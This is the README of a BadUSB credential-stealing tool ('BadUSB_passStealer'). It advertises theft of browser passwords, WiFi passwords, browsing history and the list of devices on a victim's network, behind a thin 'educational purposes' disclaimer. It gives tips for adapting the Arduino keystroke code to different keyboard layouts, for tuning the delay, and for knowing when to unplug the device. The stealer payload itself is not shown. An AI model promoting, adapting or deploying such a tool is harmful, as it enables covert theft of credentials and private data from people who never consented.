# BadUSB_passStealer
# Warning ‚ö†Ô∏è
Everything in this repository is **strictly** for educational purposes. Notice **I am not responsible** for stolen data. **You are responsible** for your actions using developed script for **BadUSB**.
# About ‚ÑπÔ∏è
This **script** allows you to steal the following **information** :
* Browser **passwords** (Chrome, Firefox, Opera);
* **WiFi** passwords;
* Browser **history** from the last 7 days;
* The list of all **devices** that are **connected to victim's network**;
### Pay attention Arduino users !
I stopped upgrading .ino scripts, if you want you can convert Ducky Scripts [here](https://duckify.huhn.me/).
### NB n¬∞1 (for arduino BadUSB)
Sometimes, you will see something like this : 
``` 
Keyboard.press(KEY_LEFT_CTRL);
Keyboard.press(KEY_LEFT_ALT);
Keyboard.press(173);
Keyboard.releaseAll(); 
```
This is only to write these characters : "@", "\\". But it depends on the computer's layout, so adapt these characters thanks to this [site](https://www.csee.umbc.edu/portal/help/theory/ascii.txt) and the sequence you actually use to wirte these characters with your keyboard. (or switch the keyboard layout to French).
### US Layout
For US layout you only have to replace by this for "\\" :
```
Keyboard.press(92);
Keyboard.releaseAll();
```
And by this for "@" :
```
Keyboard.press(64);
Keyboard.releaseAll();
```
### NB n¬∞2
You can customize the **delay** according to the speed in which you plug the **BadUSB**.
### NB n¬∞3
When you plug the BadUSB in a PC you  have to wait for the caps lock to flash to unplug it.
